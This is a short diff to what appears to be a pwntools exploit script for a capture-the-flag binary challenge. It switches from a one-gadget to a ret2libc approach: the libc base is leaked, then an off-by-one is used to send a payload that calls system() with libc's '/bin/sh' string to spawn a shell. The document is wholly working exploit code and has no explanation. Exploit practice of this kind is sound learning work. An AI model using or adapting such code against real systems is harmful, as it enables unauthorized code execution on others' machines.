@@ -41,16 +41,19 @@ def leakLibc():
     success("libcBase -> {:#x}".format(libcBase))
     oneGadget = oneGadgetOffset + libcBase
     pause()
-    return oneGadget
+    #  return oneGadget
+    return libcBase
 
-def getShell(oneGadget):
+def getShell(libcBase):
     offByOne()
-    payload = "\xff\xff\xff" + "bpbp" + p32(oneGadget)
+    #  payload = "\xff\xff\xff" + "bpbp" + p32(oneGadget)
+    payload = "\xff\xff\xff" + "bpbp" + p32(libcBase + libc.symbols["system"]) + "rret" + p32(libcBase + next(libc.search("/bin/sh")))
     
     io.sendlineafter(" :", "2")
     io.sendlineafter(" :", payload)
 
     pause()
+    DEBUG()
     io.sendlineafter(" :", "3")
 
 if __name__ == "__main__":
